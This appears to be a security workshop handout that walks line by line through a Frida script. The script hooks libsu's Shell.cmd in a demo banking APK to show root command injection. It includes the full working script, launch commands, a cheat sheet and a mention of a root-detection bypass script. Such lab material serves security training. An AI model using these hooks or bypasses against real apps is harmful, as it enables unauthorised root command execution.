# Workshop Notes — Command Injection Frida Script (Line by Line)

**File:** `guardianbank_cmd_injection.js`  
**Target app:** `com.demo.guardianbank` (GuardianBank workshop APK)  
**Vulnerability:** [gokul1630/root](https://github.com/gokul1630/root) plugin exposes `ExecuteCommand` → runs user input via `Shell.cmd(...).exec()`

---

## Remember this in 30 seconds

| Step | What | One line |
|------|------|----------|
| **1** | Enter Java world | `Java.perform(...)` |
| **2** | Get the shell class | `Java.use("com.topjohnwu.superuser.Shell")` |
| **3** | Hook the sink | Replace `Shell.cmd(String[])` |
| **4** | Run arbitrary cmd | `Shell.cmd(["sh","-c", cmd]).exec()` |
| **5** | Call from REPL | `rpc.exports.runCmd("id")` |

**Mnemonic:** **J → S → H → R → RPC** (Java → Shell → Hook → Run → Remote call)

---

## Before the code — what we are exploiting

Original Flutter plugin code (simplified):

```java
// RootPlugin.onMethodCall — method "ExecuteCommand"
String command = call.argument("cmd");   // attacker controls this
List out = Shell.cmd(command).exec().getOut();
```

GuardianBank ships the same **libsu** library (`Shell`). If app/Dart passes untrusted text into shell execution → **command injection**.

On **libsu 5.x**, `Shell.cmd` takes **`String[]`**, not a single `String`. That is why we use `["sh", "-c", "id"]`.

---

## Line-by-line explanation

### Lines 1–10 — Header comment

```javascript
/**
 * Command-injection PoC — gokul1630/root ExecuteCommand → Shell.cmd(String[])
 * ...
 */
```

| Line | Meaning |
|------|---------|
| 1–10 | Documentation only. Tells you how to run Frida and what to type in REPL. Not executed. |

**Write on board:** *Comment = run command + REPL examples*

---

### Line 11 — Strict mode

```javascript
"use strict";
```

| Line | Meaning |
|------|---------|
| 11 | JavaScript strict mode — catches typos and bad variables early. Good habit in Frida scripts. |

**Remember:** `"use strict"` = safer JS

---

### Line 13 — Enter the Android Java runtime

```javascript
Java.perform(function () {
```

| Line | Meaning |
|------|---------|
| 13 | **Most important line in any Java Frida script.** Waits until the Android app’s JVM is ready, then runs your code inside it. Everything below must live inside this callback. |

**Remember:** **No `Java.perform` → hooks never attach**

---

### Line 14 — Load the shell class

```javascript
    var Shell = Java.use("com.topjohnwu.superuser.Shell");
```

| Line | Meaning |
|------|---------|
| 14 | Gets a Frida wrapper around the real Java class `com.topjohnwu.superuser.Shell` (from **libsu**). This is the same class the root plugin uses to run shell commands. |

**Remember:** `Java.use("full.class.Name")` = handle to Java class

---

### Lines 16–20 — Configure root shell (optional setup)

```javascript
    try {
        Shell.setDefaultBuilder(
            Shell.Builder.create().setFlags(Shell.FLAG_MOUNT_MASTER)
        );
    } catch (e) { /* ok */ }
```

| Line | Meaning |
|------|---------|
| 16–20 | Matches what the root plugin does on startup: configure libsu with `FLAG_MOUNT_MASTER` so shell commands run with proper root context on a rooted device. Wrapped in `try/catch` because the app may already have set this. |

**Remember:** *Same builder as RootPlugin — behave like the real plugin*

---

### Lines 22–30 — Hook `Shell.cmd` (the sink)

```javascript
    var origCmd = Shell.cmd.overload("[Ljava.lang.String;");
    Shell.cmd.overload("[Ljava.lang.String;").implementation = function (argv) {
        var parts = [];
        for (var i = 0; i < argv.length; i++) {
            parts.push(String(argv[i]));
        }
        console.log("[CMD-INJ] Shell.cmd(" + parts.join(" | ") + ")");
        return origCmd.call(this, argv);
    };
```

| Line | Meaning |
|------|---------|
| 22 | Save the **original** `Shell.cmd(String[])` method. `[Ljava.lang.String;` is JNI notation for `String[]`. |
| 23 | Replace that method with our function — runs **every time** the app (or we) call `Shell.cmd`. |
| 24–27 | Loop over each argument in the array and convert to JS string for logging. |
| 28 | **Log** the command — proof for workshop / Burp-style evidence. |
| 29 | Call the **real** method with `origCmd.call(this, argv)` so the app still works. **Never skip this** or you break the app. |

**Remember hook pattern:**

```
save original → set .implementation → log → call original
```

**Why `overload("[Ljava.lang.String;")`?**  
libsu 5 has no `Shell.cmd(String)`. Only `String[]` and `InputStream`. Hooking the wrong overload caused your earlier error.

---

### Line 31 — Confirm hook installed

```javascript
    console.log("[+] Shell.cmd(String[]) hooked");
```

| Line | Meaning |
|------|---------|
| 31 | Prints success in Frida console when script loads. |

---

### Lines 33–35 — Build command array

```javascript
    function toArgv(cmd) {
        return Java.array("java.lang.String", ["sh", "-c", String(cmd)]);
    }
```

| Line | Meaning |
|------|---------|
| 33–35 | Converts one string (e.g. `"id"`) into a Java `String[]`: `["sh", "-c", "id"]`. The shell interprets `-c` as “run this command string”. Allows pipes, `;`, etc. |

**Remember:** `Java.array("java.lang.String", [...])` = create Java array from JS

**Workshop demo commands:**

| You type | What runs |
|----------|-----------|
| `id` | Shows user (root if uid=0) |
| `cat /proc/version` | Kernel version |
| `getprop ro.build.tags` | Build tags |

---

### Lines 37–47 — Execute command and read output

```javascript
    function run(cmd) {
        var r = Shell.cmd(toArgv(cmd)).exec();
        var out = r.getOut();
        var text = "";
        for (var i = 0; i < out.size(); i++) {
            text += out.get(i) + "\n";
        }
        text += "exit=" + r.getCode();
        console.log("[CMD-INJ] output:\n" + text);
        return text;
    }
```

| Line | Meaning |
|------|---------|
| 37 | Helper function — runs one command string. |
| 38 | **Same chain as the vulnerability:** `Shell.cmd(...).exec()` → returns a `Shell.Result`. |
| 39 | `getOut()` = stdout lines as Java `List`. |
| 40–43 | Loop: copy each line into one JS string. |
| 44 | Append exit code (`0` = success). |
| 45 | Print full output to Frida console (screenshot for report). |
| 46 | Return text to caller (RPC). |

**Remember execution chain:**

```
Shell.cmd(argv).exec() → getOut() → loop → exit code
```

---

### Lines 49–57 — Expose `runCmd` to Frida REPL

```javascript
    rpc.exports = {
        runCmd: function (cmd) {
            var result = "";
            Java.perform(function () {
                result = run(cmd);
            });
            return result;
        }
    };
```

| Line | Meaning |
|------|---------|
| 49 | `rpc.exports` = functions you can call from Frida interactive prompt. |
| 50–55 | `runCmd("id")` wraps `run()` in another `Java.perform` so it is safe when called from REPL after spawn. |
| 55 | Returns command output as string. |

**Remember:** `rpc.exports.runCmd("...")` = **you** become the attacker sending `ExecuteCommand`

---

### Lines 59–60 — Ready message and close

```javascript
    console.log("[CMD-INJ] Ready — rpc.exports.runCmd('id')");
});
```

| Line | Meaning |
|------|---------|
| 59 | Tells you the script finished loading. |
| 60 | Closes the outer `Java.perform(function () {` from line 13. |

---

## How to run (workshop demo)

```powershell
frida -U -f com.demo.guardianbank -l PPS_UAT\GuardianBank\guardianbank_cmd_injection.js
```

In Frida prompt:

```javascript
rpc.exports.runCmd("id")
```

**Expected on rooted emulator:**

```
uid=0(root) gid=0(root) ...
exit=0
```

---

## Whiteboard cheat sheet (copy from memory)

```
1. Java.perform(() => {

2.   Shell = Java.use("com.topjohnwu.superuser.Shell")

3.   orig = Shell.cmd.overload("[Ljava.lang.String;")
      Shell.cmd.overload("[Ljava.lang.String;").implementation = function(argv) {
          log argv
          return orig.call(this, argv)
      }

4.   run(cmd) {
        r = Shell.cmd(Java.array("java.lang.String", ["sh","-c", cmd])).exec()
        read r.getOut(), r.getCode()
      }

5.   rpc.exports = { runCmd: (cmd) => run(cmd) }

6. })
```

---

## Common mistakes (your session)

| Error | Cause | Fix |
|-------|-------|-----|
| `cmd(): argument types do not match` | Hooked `Shell.cmd(String)` | Use `overload("[Ljava.lang.String;")` |
| No output / not root | Non-rooted device | Use rooted AVD |
| Hook never fires | Forgot `Java.perform` | Wrap everything in `Java.perform` |

---

## Related workshop script

**Root bypass** (so login works before you demo injection):

`guardianbank_root_bypass.js` — forces `isRooted()` / `isRootAvailable()` to return `false`.

Run both with spawn:

```powershell
frida -U -f com.demo.guardianbank `
  -l PPS_UAT\GuardianBank\guardianbank_root_bypass.js `
  -l PPS_UAT\GuardianBank\guardianbank_cmd_injection.js
```

---

## Report one-liner (for findings sheet)

> The app embeds the gokul/root plugin stack (libsu `Shell.cmd`). User-controlled input passed to `ExecuteCommand` executes arbitrary shell commands as root on compromised/rooted devices, demonstrating OS command injection (CWE-78).
